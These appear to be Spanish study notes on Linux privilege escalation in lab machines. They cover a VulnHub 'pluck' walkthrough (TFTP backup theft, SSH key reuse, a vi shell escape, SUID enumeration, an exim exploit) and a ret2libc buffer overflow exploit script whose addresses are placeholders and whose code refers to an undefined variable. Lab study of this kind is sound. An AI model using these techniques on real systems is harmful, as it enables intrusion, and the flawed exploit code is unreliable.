> De aca nos aprovechamos de binarios especificos que tengan una ejecucion insegura y permita manipular que otros archivos ejecutar y con ello ganar privilegios.

## Paso a paso
### Exim
- Descagamos la imagen iso de **vulnhub** `pluck:1`
- Hacemos el descubrimiento tipico
- Descubrimos que tiene un servicio http corriendo y podemos leer archivos internos del servidor, entre ellos el /etc/passwd con la ultima linea interesante
- Esa ultima linea ejecuta un archivo `/usr/local/scripts/backup.sh`

- El servidor tambien utiliza un protocolo **tftp** que es para transferir archivos, similar al smb
- Si nos conectamos a la maquina victima, podemos obtener el archivo .tar
```
tftp 192.168.111.46
get backup.tar
exit
```
- En la maquina del atacante debemos descomprimir
```
ls
tar -xf backup.tar
rm backup.tar
tree
```
- Veremos claves publicas y privadas de los usuarios, e intentaremos conectarnos con alguna de ellas a un usuario.
```
cd /paul/keys
ssh paul@192.168.111.46 -i id_key2
```
- Vamos probando todas las claves hasta que aparece un menu
- Este menu me deja elegir entre abrir un archivo, crear uno nuevo, etc.
- Vamos a **gtfobins** y buscamos **vi shell** para ganar privilegios
```
vi 
:set shell=/bin/bash
escape :shell
export TERM=xterm
```
- Gano una consola y empiezo a investigar a que grupo pertenece ese usuario, que sistema operativo tiene, archivos con permisos SUID
```
id
lsb_release -a
cat /etc/os-release
uname -a
find / -perm -4000 2>/dev/null
```
- Veo un programa **exim** que es un agente de transporte de correo utilizado en unix
- Buscamos en searchsploit algun script para romper y lo compartimos a la maquina victima y ejecutamos


### Desarrollo incorrecto - Bufferoverflow
- Descargamos una imagen de ubuntu.com/16.04/ de 32 bits que no tiene entorno grafico y creamos una maquina virtual en virtualbox/vmware
- Utilizamos un binario **custom.sh** de savitar
- Al iniciar la maquina hacemos:
```
apt update
apt install ssh gdb git
service start ssh
```
- Utilizamos el servicio ssh para conectarnos a traves de nuestra maquina de atacante
```
ssh savitar@ip
cd /usr/bin
wget binario/custom/de/savitar
chmod +x custom
```
- Descargamos el binario customizado en la victima

- gdb es un **software de depuración** de código libre y de línea de comandos, fundamental en el desarrollo de software bajo Linux y sistemas Unix. Permite "entrar" en un programa en tiempo real para observar su ejecución, detenerlo, inspeccionar variables, y corregir errores en lenguajes como **C, C++ y Rust**.
- A esto le agregamos **peda** que le agrega estilos a gdb para mejorarlo esteticamente

- Si probamos ejecutar el programa no hace nada, pero probando con entradas cada vez mas largas veremos errores que ocasionan
`custom Hola`  
`custom AAAAAAAAAAAAAAAAAAAAAAAAAAAAA`  
`custom y muchisimas A`  
- En esta ultima ejecucion ocurre un **Segmentation fault**
	A segmentation fault (segfault) is a specific error occurring when a program attempts to access a memory location it is not allowed to or in a way that is not permitted (e.g., writing to read-only memory).
		Es un mecanismo de defensa

- Aca se puede introducir un [[Bufferoverflow]]
- Hay programas que cortan la entrada del usuario pero no controlan que pasa si coloca mucho mas el usuario.
- Para entender que es lo que pasa dentro del codigo utilizamos el debugger **gbd**
- Lo ejecutamos
```
gdb custom
```
- Corremos el programa con esa entrada
```
r AAAAAAAAAAAAAAAAAAAAAAA
```
- Lo corremos de nuevo
```
r y muchisimas A
```
- Muestra un error, direcciones de memoria y lo que esta dentro
- Entre esas direcciones de memoria esta el **EIP** apunta a diferentes direcciones y hace que el programa corra bien
- Estariamos reescribiendo registros que hacen algo, que, si ahora le colocamos un comando que tenga sentido y lo ejecuta **podemos hacer lo que queramos**
- Podemos hacer que ese registro apunte a un payload malicioso

- Hay que tratar de averiguar en que momento, en que posicion empieza a guardar en ese registro
```
gdb /usr/bin/custom -q
pattern create 300
r 'cadena que genera el anterior'
```
- En el EIP aparece algo que tiene sentido para nosotros
- Podemos hacerlo manualmente
```
echo 'cadena enorme' | grep EIP
```
- O con gdb
```
gdb 
pattern offset $eip
```
- Te devuelve en cuantos caracteres hace el offset 
- Armamos la cadena maliciosa, para probar
```
r $(python3 -c 'print("A")\*112 + "B"\*4)'
```
- Ya controlo lo que coloco en el eid

- Aca se hace todo un entramado para saber bien las direcciones de memoria que debemos apuntar pero basicamente el flujo que queremos lograr es este
```python
ret2libc -> system + exit + bin_sh
```
- Que es abusar del **libc** para aplicar una llamada a nivel de sistema y abrirnos una shell
- Luego de obtener esa cosa rara armamos el script
```python
nano exploit.py
-----------------------------------------------------------
#!/usr/bin/python3

import subprocess
import sys
from struct import pack

offset = 112
junk = b"A"\*112

\# ret2libc -> system + exit + bin_sh
base_libc_addr = 0x7584935728

system_addr_off = 0x43434343
exit_addr_off = 0x43234543
bin_sh_addr_off = 0x78658734

system_addr = pack("<L", base_libc_addr + system_addr_off)
exit_addr = pack("<L", base_libc_addr + exit_addr_off)
bin_sh = pack("<L", base_libc_addr + bin_sh_addr_off)

payload = junk + system_addr + exit_addr + bin_sh_addr

while True:
	result = subprocess.run(["sudo", "/usr/bin/custom", payload])
	if result.returncode == 0:
		print("\n\n[+] Se ha salido correctamente del programa")
		sys.exit(0)
-----------------------------------------------------------
```
- Ejecutamos
```
python3 exploit.py
```






